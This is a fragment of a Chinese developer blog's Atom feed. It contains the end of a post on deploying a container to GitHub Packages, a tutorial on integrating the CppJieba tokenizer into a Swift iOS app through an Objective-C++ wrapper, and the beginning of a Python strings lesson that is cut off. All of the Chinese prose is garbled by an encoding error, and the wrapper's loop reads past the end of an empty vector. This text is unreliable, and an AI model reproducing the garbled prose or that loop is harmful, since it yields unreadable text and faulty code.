<code>GITHUB_TOKEN</code>â”€â”€ä»¤ç‰Œå¯¹æˆ‘ä»¬å­˜å‚¨åº“ä¸­çš„è½¯ä»¶åŒ…å…·æœ‰å‘å¸ƒæƒé™ã€‚</p><span id="more"></span><p>ç„¶åï¼Œæˆ‘ä»¬å°†æ„å»ºå®¹å™¨ï¼Œå¹¶ä½¿ç”¨åŒ…æ³¨å†Œçš„åç§°å¯¹å…¶è¿›è¡Œæ ‡è®°ï¼ˆåœ¨æœ¬ä¾‹ä¸­æ˜¯ <code>docker.pkg.github.com</code> å…¶åä¸ºå®¹å™¨çš„åç§° <code>ethomson/myrepo/app</code>ï¼‰ï¼Œå¹¶ä¸ºå…¶æŒ‡å®šç‰ˆæœ¬å·ï¼Œå³Unixæ—¶é—´ã€‚</p><p>æœ€åï¼Œæˆ‘ä»¬<a href="https://gist.github.com/ethomson/60e664ef09051cea66dada5d53c62e6d">å°†å®¹å™¨æ¨é€åˆ°GitHub Packages</a>ã€‚</p><script src="https://gist.github.com/ethomson/60e664ef09051cea66dada5d53c62e6d.js"></script><p>ç°åœ¨ï¼Œæˆ‘æœ‰ä¸€ä¸ªç®€å•çš„è¿ç»­éƒ¨ç½²ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿå°†å§‹ç»ˆä½¿ç”¨åŒ…å«æ¥è‡ªmasteråˆ†æ”¯çš„æœ€æ–°ç‰ˆæœ¬çš„å®¹å™¨æ¥æ›´æ–°GitHub Packagesã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html">https://www.edwardthomson.com/blog/github_actions_9_deploy_to_github_packages.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬9å¤©ï¼šéƒ¨ç½²åˆ°GitHub Packages
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨iOS-Swifté¡¹ç›®ä¸­é›†æˆCppJiebaåˆ†è¯</title>
    <link href="https://qiwihui.com/qiwihui-blog-45/"/>
    <id>https://qiwihui.com/qiwihui-blog-45/</id>
    <published>2022-08-13T01:54:25.640Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨åƒåœ¾çŸ­ä¿¡è¿‡æ»¤åº”ç”¨ <code>SMSFilters</code> ä¸­ï¼Œéœ€è¦ä½¿ç”¨ <code>Jieba</code> åˆ†è¯åº“æ¥å¯¾çŸ­ä¿¡è¿›è¡Œåˆ†è¯ï¼Œç„¶åä½¿ç”¨ <code>TF-IDF</code> æ¥è¿›è¡Œå¤„ç†` åˆ†è¯åº“æ˜¯ C++ å†™çš„ï¼Œè¿™å°±æ„å‘³ç€éœ€è¦åœ¨Swiftä¸­é›†æˆ C++ åº“ã€‚åœ¨å®˜æ–¹æ–‡æ¡£ â€œ<a href="https://developer.apple.com/library/prerelease/ios/documentation/Swift/Conceptual/BuildingCocoaApps/index.html">Using Swift with Cocoa and Objective-C</a>â€ ä¸­ï¼ŒAppleåªæ˜¯ä»‹ç»äº†æ€ä¹ˆå°† Swift ä»£ç è·Ÿ Objective-C ä»£ç åšæ•´åˆï¼Œä½†æ˜¯æ²¡æœ‰æC++ï¼Œåæ¥åœ¨å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°äº†è¿™æ ·ä¸€æ®µè¯ï¼š</p><blockquote><p>You cannot import C++ code directly into Swift. Instead, create an Objective-C or C wrapper for C++ code.</p></blockquote><p>ä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥å¯¼å…¥ C++ ä»£ç ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ Objective-C æˆ–è€… C å¯¹ C++ è¿›è¡Œå°è£…ã€‚æ‰€ä»¥é¡¹ç›®ä¸­ä½¿ç”¨ Objective-C åšå°è£…ï¼Œç„¶ååœ¨ Swift ä¸­è°ƒç”¨ï¼Œä¸‹é¢å°±æ˜¯è¿™ä¸ªè¿‡ç¨‹çš„å®è·µï¼ŒDemo ä»£ç è§ <a href="https://github.com/qiwihui/SwiftJiebaDemo">SwiftJiebaDemo</a>ã€‚</p><span id="more"></span><h2><span id="zheng-he-guo-cheng">æ•´åˆè¿‡ç¨‹</span></h2><p>åˆ†æˆä¸‰æ­¥ï¼š</p><ol><li>å¼•å…¥C++æ–‡ä»¶ï¼›</li><li>ç”¨ Objective-C å°è£…ï¼›</li><li>åœ¨ Swift ä¸­ è°ƒç”¨ Objective-Cï¼›</li></ol><h3><span id="yin-ru-c-wen-jian">å¼•å…¥C++æ–‡ä»¶</span></h3><p>Demoä¸­ä½¿ç”¨çš„æ˜¯&quot;ç»“å·´&quot;ä¸­æ–‡åˆ†è¯çš„ C++ ç‰ˆæœ¬ <a href="https://github.com/yanyiwu/cppjieba">yanyiwu/cppjieba</a>ã€‚å°†å…¶ä¸­çš„ <code>include/cppjieba</code> å’Œä¾èµ– <code>limonp</code> åˆå¹¶ï¼Œå¹¶åŠ å…¥ <code>dict</code> ä¸­çš„ <code>hmm_model</code> å’Œ <code>jiaba.dict</code> ä½œä¸ºåŸºç¡€æ•°æ®ï¼Œå¹¶æš´éœ² <code>JiebaInit</code> å’Œ  <code>JiebaCut</code> æ¥å£ï¼š</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Segmentor.cpp</span></span><br><span class="line"><span class="comment">//  iosjieba</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by yanyiwu on 14/12/24.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014å¹´ yanyiwu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Segmentor.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cppjieba;</span><br><span class="line"></span><br><span class="line">cppjieba::MixSegment * globalSegmentor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaInit</span><span class="params">(<span class="type">const</span> string&amp; dictPath, <span class="type">const</span> string&amp; hmmPath, <span class="type">const</span> string&amp; userDictPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(globalSegmentor == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        globalSegmentor = <span class="keyword">new</span> <span class="built_in">MixSegment</span>(dictPath, hmmPath, userDictPath);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; __FILE__ &lt;&lt; __LINE__ &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaCut</span><span class="params">(<span class="type">const</span> string&amp; sentence, vector&lt;string&gt;&amp; words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">assert</span>(globalSegmentor);</span><br><span class="line">    globalSegmentor-&gt;<span class="built_in">Cut</span>(sentence, words);</span><br><span class="line">    cout &lt;&lt; __FILE__ &lt;&lt; __LINE__ &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; words &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»¥åŠ</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Segmentor.h</span></span><br><span class="line"><span class="comment">//  iosjieba</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by yanyiwu on 14/12/24.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014å¹´ yanyiwu. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __iosjieba__Segmentor__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __iosjieba__Segmentor__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cppjieba/MixSegment.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> cppjieba::MixSegment * globalSegmentor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaInit</span><span class="params">(<span class="type">const</span> std::string&amp; dictPath, <span class="type">const</span> std::string&amp; hmmPath, <span class="type">const</span> std::string&amp; userDictPath)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JiebaCut</span><span class="params">(<span class="type">const</span> std::string&amp; sentence, std::vector&lt;std::string&gt;&amp; words)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* defined(__iosjieba__Segmentor__) */</span></span></span><br></pre></td></tr></table></figure><p>ç›®å½•å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree iosjieba</span><br><span class="line">iosjieba</span><br><span class="line">â”œâ”€â”€ Segmentor.cpp</span><br><span class="line">â”œâ”€â”€ Segmentor.h</span><br><span class="line">â”œâ”€â”€ cppjieba</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ DictTrie.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ FullSegment.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ HMMModel.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ HMMSegment.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Jieba.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ KeywordExtractor.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ MPSegment.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ MixSegment.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ PosTagger.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ PreFilter.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ QuerySegment.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SegmentBase.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ SegmentTagged.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ TextRankExtractor.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Trie.hpp</span><br><span class="line">â”‚Â Â  â”œâ”€â”€ Unicode.hpp</span><br><span class="line">â”‚Â Â  â””â”€â”€ limonp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ ArgvContext.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ BlockingQueue.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ BoundedBlockingQueue.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ BoundedQueue.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Closure.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Colors.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Condition.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Config.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ FileLock.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ ForcePublic.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ LocalVector.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Logging.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Md5.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ MutexLock.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ NonCopyable.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ StdExtension.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ StringUtil.hpp</span><br><span class="line">â”‚Â Â      â”œâ”€â”€ Thread.hpp</span><br><span class="line">â”‚Â Â      â””â”€â”€ ThreadPool.hpp</span><br><span class="line">â””â”€â”€ iosjieba.bundle</span><br><span class="line">    â””â”€â”€ dict</span><br><span class="line">        â”œâ”€â”€ hmm_model.utf8</span><br><span class="line">        â”œâ”€â”€ jieba.dict.small.utf8</span><br><span class="line">        â””â”€â”€ user.dict.utf8</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¼€å§‹åœ¨é¡¹ç›®ä¸­é›†æˆã€‚é¦–å…ˆåˆ›å»ºä¸€ä¸ªç©ºé¡¹ç›® <code>iOSJiebaDemo</code>ï¼Œå°† <code>iosjieba</code> åŠ å…¥é¡¹ç›®ä¸­ã€‚</p><table><thead><tr><th style="text-align:center">å•é¡µåº”ç”¨</th><th style="text-align:center">SwiftJiebaDemo</th><th style="text-align:center">æ·»åŠ  SwiftJiebaDemo</th></tr></thead><tbody><tr><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162445-26d16780-18d1-11e9-9385-123b8b64fbb9.png" alt="create-single-view-app"></td><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162258-8713d980-18d0-11e9-9c9e-ffec10c8d2dc.png" alt="swift-jieba-demo-1"></td><td style="text-align:center"><img src="https://user-images.githubusercontent.com/3297411/51162266-8f6c1480-18d0-11e9-922e-a5b728e85eb9.png" alt="swift-jieba-demo-2"></td></tr></tbody></table><p>æ·»åŠ  iosjieba:</p><p><img src="https://user-images.githubusercontent.com/3297411/51162030-ae1ddb80-18cf-11e9-8e2f-8692e2e7f915.png" alt="iosjieba-1"></p><p>è§ä»£ç ï¼š <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/caeb6c2f9fb005a9bc518ee67890814481676807">https://github.com/qiwihui/SwiftJiebaDemo/commit/caeb6c2f9fb005a9bc518ee67890814481676807</a></p><h3><span id="c-dao-objective-c-feng-zhuang">C++ åˆ° Objective-C å°è£…</span></h3><p>è¿™ä¸ªè¿‡ç¨‹æ˜¯å°† C++ çš„æ¥å£è¿›è¡Œ Objective-C å°è£…ï¼Œå‘ Swift æš´éœ²ã€‚è¿™ä¸ªå°è£…åªæš´éœ²äº† <code>objcJiebaInit</code> å’Œ <code>objcJiebaCut</code> ä¸¤ä¸ªæ¥å£ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  iosjiebaWrapper.h</span><br><span class="line">//  SMSFilters</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/14/19.</span><br><span class="line">//  Copyright Â© 2019 qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line"></span><br><span class="line">@interface JiebaWrapper : NSObject</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaInit: (NSString *) dictPath forPath: (NSString *) hmmPath forDictPath: (NSString *) userDictPath;</span><br><span class="line">- (void) objcJiebaCut: (NSString *) sentence toWords: (NSMutableArray *) words;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  iosjiebaWrapper.mm</span><br><span class="line">//  iOSJiebaTest</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/14/19.</span><br><span class="line">//  Copyright Â© 2019 Qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;iosjiebaWrapper.h&quot;</span><br><span class="line">#include &quot;Segmentor.h&quot;</span><br><span class="line"></span><br><span class="line">@implementation JiebaWrapper</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaInit: (NSString *) dictPath forPath: (NSString *) hmmPath forDictPath: (NSString *) userDictPath &#123;</span><br><span class="line"></span><br><span class="line">    const char *cDictPath = [dictPath UTF8String];</span><br><span class="line">    const char *cHmmPath = [hmmPath UTF8String];</span><br><span class="line">    const char *cUserDictPath = [userDictPath UTF8String];</span><br><span class="line">    </span><br><span class="line">    JiebaInit(cDictPath, cHmmPath, cUserDictPath);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void) objcJiebaCut: (NSString *) sentence toWords: (NSMutableArray *) words &#123;</span><br><span class="line">    </span><br><span class="line">    const char* cSentence = [sentence UTF8String];</span><br><span class="line">    </span><br><span class="line">    std::vector&lt;std::string&gt; wordsList;</span><br><span class="line">    for (int i = 0; i &lt; [words count];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        wordsList.push_back(wordsList[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    JiebaCut(cSentence, wordsList);</span><br><span class="line">    </span><br><span class="line">    [words removeAllObjects];</span><br><span class="line">    std::for_each(wordsList.begin(), wordsList.end(), [&amp;words](std::string str) &#123;</span><br><span class="line">        id nsstr = [NSString stringWithUTF8String:str.c_str()];</span><br><span class="line">        [words addObject:nsstr];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@end</span><br></pre></td></tr></table></figure><p>è§ä»£ç ï¼š <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/7d196bb2c33280a4f419be21b47961a521618221">https://github.com/qiwihui/SwiftJiebaDemo/commit/7d196bb2c33280a4f419be21b47961a521618221</a></p><h3><span id="objective-c-dao-swift">Objective-C åˆ° Swift</span></h3><p>åœ¨ Swift ä¸­è°ƒç”¨ Objecttive-C çš„æ¥å£ï¼Œè¿™ä¸ªåœ¨å®˜æ–¹æ–‡æ¡£å’Œè®¸å¤šåšå®¢ä¸­éƒ½æœ‰è¯¦ç»†ä»‹ç»ã€‚</p><ol><li>åŠ å…¥ <code>&#123;project_name&#125;-Bridging-Header.h</code> å¤´æ–‡ä»¶ï¼Œå³ <code>SwiftJiebaDemo_Bridging_Header_h</code>ï¼Œå¼•å…¥ä¹‹å‰å°è£…çš„å¤´æ–‡ä»¶ï¼Œå¹¶åœ¨ <code>Targets -&gt; Build Settings -&gt; Objective-C Bridging Header</code> ä¸­è®¾ç½®å¤´æ–‡ä»¶è·¯å¾„ <code>SwiftJiebaDemo/SwiftJiebaDemo_Bridging_Header_h</code>ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//</span><br><span class="line">//  SwiftJiebaDemo-Bridging-Header.h</span><br><span class="line">//  SwiftJiebaDemo</span><br><span class="line">//</span><br><span class="line">//  Created by Qiwihui on 1/15/19.</span><br><span class="line">//  Copyright Â© 2019 Qiwihui. All rights reserved.</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">#ifndef SwiftJiebaDemo_Bridging_Header_h</span><br><span class="line">#define SwiftJiebaDemo_Bridging_Header_h</span><br><span class="line"></span><br><span class="line">#import &quot;iosjiebaWrapper.h&quot;</span><br><span class="line"></span><br><span class="line">#endif /* SwiftJiebaDemo_Bridging_Header_h */</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/3297411/51162068-d60d3f00-18cf-11e9-951f-ec5c20e984dc.png" alt="bridging-header-2"></p><ol start="2"><li>å°†ä½¿ç”¨åˆ° C++ çš„ Objective-C æ–‡ä»¶ä¿®æ”¹ä¸º Objective-C++ æ–‡ä»¶ï¼Œå³ å°† <code>.m</code> æ”¹ä¸º <code>.mm</code>: <code>iosjiebaWrapper.m</code> æ”¹ä¸º <code>iosjiebaWrapper.mm</code>ã€‚</li></ol><p>è§ä»£ç ï¼š<a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/94852b1357b0a0a4b2e8b92384fbdb1b16c80ed8">https://github.com/qiwihui/SwiftJiebaDemo/commit/94852b1357b0a0a4b2e8b92384fbdb1b16c80ed8</a></p><h3><span id="shi-yong">ä½¿ç”¨</span></h3><p>ä½¿ç”¨æ—¶éœ€è¦å…ˆåˆå§‹åŒ– <code>Jiaba</code>åˆ†è¯ï¼Œç„¶åå†è¿›è¡Œåˆ†è¯ã€‚</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Classifier</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">init</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> dictPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/jieba.dict.small.utf8&quot;</span></span><br><span class="line">        <span class="keyword">let</span> hmmPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/hmm_model.utf8&quot;</span></span><br><span class="line">        <span class="keyword">let</span> userDictPath <span class="operator">=</span> <span class="type">Bundle</span>.main.resourcePath<span class="operator">!+</span><span class="string">&quot;/iosjieba.bundle/dict/user.dict.utf8&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="type">JiebaWrapper</span>().objcJiebaInit(dictPath, forPath: hmmPath, forDictPath: userDictPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">func</span> <span class="title function_">tokenize</span>(<span class="keyword">_</span> <span class="params">message</span>:<span class="type">String</span>) -&gt; [<span class="type">String</span>] &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;tokenize...&quot;</span>)</span><br><span class="line">        <span class="keyword">let</span> words <span class="operator">=</span> <span class="type">NSMutableArray</span>()</span><br><span class="line">        <span class="type">JiebaWrapper</span>().objcJiebaCut(message, toWords: words)</span><br><span class="line">        <span class="keyword">return</span> words <span class="keyword">as!</span> [<span class="type">String</span>]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ§åˆ¶å°è¾“å‡ºç»“æœï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/51162211-5a5fc200-18d0-11e9-9849-c86d2fbf683d.png" alt="result"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæµ‹è¯•ç”¨ä¾‹ <code>å°æ˜ç¡•å£«æ¯•ä¸šäºä¸­å›½ç§‘å­¦é™¢è®¡ç®—æ‰€ï¼Œååœ¨æ—¥æœ¬äº¬éƒ½å¤§å­¦æ·±é€ </code> ç»è¿‡åˆ†è¯åä¸º<code>ã€”æ‹¼éŸ³ã€•[&quot;å°æ˜&quot;, &quot;ç¡•å£«&quot;, &quot;æ¯•ä¸š&quot;, &quot;äº&quot;, &quot;ä¸­å›½ç§‘å­¦é™¢&quot;, &quot;è®¡ç®—æ‰€&quot;, &quot;ï¼Œ&quot;, &quot;å&quot;, &quot;åœ¨&quot;, &quot;æ—¥æœ¬&quot;, &quot;äº¬éƒ½å¤§å­¦&quot;, &quot;æ·±é€ &quot;]</code>ï¼Œå®Œæˆé›†æˆã€‚</p><p>è§ä»£ç ï¼š <a href="https://github.com/qiwihui/SwiftJiebaDemo/commit/bc42e1312dff6a9f7171cc69403136bc8a82204c">https://github.com/qiwihui/SwiftJiebaDemo/commit/bc42e1312dff6a9f7171cc69403136bc8a82204c</a></p><h2><span id="yu-dao-de-wen-ti">é‡åˆ°çš„é—®é¢˜</span></h2><p>ç”±äºè‡ªå·±å¯¹äºç¼–è¯‘é“¾æ¥åŸç†ä¸äº†è§£ï¼Œä»¥åŠæ˜¯ iOS å¼€å‘åˆå­¦ï¼Œå› æ­¤ä¸Šé¢çš„è¿™ä¸ªè¿‡ç¨‹ä¸­é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œè€—æ—¶ä¸¤å‘¨æ‰è§£å†³ï¼Œæ•…å°†é‡åˆ°çš„ä¸€äº›é—®é¢˜è®°å½•äºæ­¤ï¼Œä»¥ä¾¿æ—¥åã€‚</p><ol start="0"><li><code>&quot;cassert&quot; file not found</code></li></ol><p>å°† <code>.m</code> æ”¹ä¸º <code>.mm</code> å³å¯ã€‚</p><ol><li><code>compiler not finding &lt;tr1/unordered_map&gt;</code></li></ol><p>è®¾ç½® <code>C++ Standard Library</code> ä¸º <code>LLVM libc++</code></p><p><img src="https://user-images.githubusercontent.com/3297411/51225371-3f02be80-1985-11e9-9705-32de84b5dfad.png" alt="llvm"></p><p>å‚è€ƒï¼š <a href="https://stackoverflow.com/questions/42030598/mac-c-compiler-not-finding-tr1-unordered-map">mac c++ compiler not finding &lt;tr1/unordered_map&gt;</a></p><ol start="2"><li><code>warning: include path for stdlibc++ headers not found; pass '-std=libc++' on the command line to use the libc++ standard library instead [-Wstdlibcxx-not-found]</code></li></ol><p><code>Build Setting -&gt; C++ Standard Library -&gt; libstdc++</code> ä¿®æ”¹ä¸º <code>Build Setting -&gt; C++ Standard Library -&gt; libc++</code></p><ol start="3"><li><code>use of unresolved identifier</code></li></ol><p>è¿™ä¸ªé—®é¢˜åœ¨äºå‘é¡¹ç›®ä¸­åŠ å…¥æ–‡ä»¶æ—¶ï¼Œ<code>Target Membership</code> è®¾ç½®ä¸æ­£ç¡®å¯¼è‡´ã€‚éœ€è¦å°†å¯¹äºä½¿ç”¨åˆ°çš„ Target éƒ½å‹¾ä¸Šã€‚</p><p>ç›¸å…³å‚è€ƒï¼š <a href="https://learnappmaking.com/unresolved-identifier-understanding-xcode/">Understanding The â€œUse of Unresolved Identifierâ€ Error In Xcode</a></p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://stackoverflow.com/users/218152/swiftarchitect">SwiftArchitect</a> å¯¹é—®é¢˜ â€œCan I have Swift, Objective-C, C and C++ files in the same Xcode project?â€ çš„<a href="https://stackoverflow.com/a/32546879/3218128">å›ç­”</a></li><li><a href="https://stackoverflow.com/users/218152/swiftarchitect">SwiftArchitect</a> å¯¹é—®é¢˜ â€œCan I mix Swift with C++? Like the Objective - C .mm filesâ€ çš„<a href="https://stackoverflow.com/a/32554229/3218128">å›ç­”</a></li><li><a href="https://blog.voidmain.guru/2014/07/01/integrating-swift-with-c-plus-plus/">åœ¨Swiftä»£ç ä¸­æ•´åˆC++ç±»åº“</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨iOS-Swifté¡¹ç›®ä¸­é›†æˆCppJiebaåˆ†è¯
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>05. å­—ç¬¦ä¸² â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-122/"/>
    <id>https://qiwihui.com/qiwihui-blog-122/</id>
    <published>2022-08-13T01:54:25.630Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å­—ç¬¦ä¸²æ˜¯å­—ç¬¦åºåˆ—ã€‚ Pythonä¸­çš„å­—ç¬¦ä¸²ç”¨åŒå¼•å·æˆ–å•å¼•å·å¼•èµ·æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br></pre></td></tr></table></figure><p>Pythonå­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œè¿™æ„å‘³ç€å®ƒä»¬åœ¨åˆ›å»ºåå°±æ— æ³•æ›´æ”¹ã€‚</p><span id="more"></span><h3><span id="chuang-jian">åˆ›å»º</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨å•å¼•å·åè€…åŒå¼•å·</span></span><br><span class="line">my_string = <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">my_string = <span class="string">&quot;Hello&quot;</span></span><br><span class="line">my_string = <span class="string">&quot;I&#x27; m  a &#x27;Geek&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è½¬ä¹‰åæ–œæ </span></span><br><span class="line">my_string = <span class="string">&#x27;I\&#x27; m  a &quot;Geek&quot;&#x27;</span></span><br><span class="line">my_string = <span class="string">&#x27;I\&#x27; m a \&#x27;Geek\&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šè¡Œå­—ç¬¦ä¸²ä½¿ç”¨ä¸‰ä¸ªå¼•å·</span></span><br><span class="line">my_string = <span class="string">&quot;&quot;&quot;Hello</span></span><br><span class="line"><span class="string">World&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(my_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 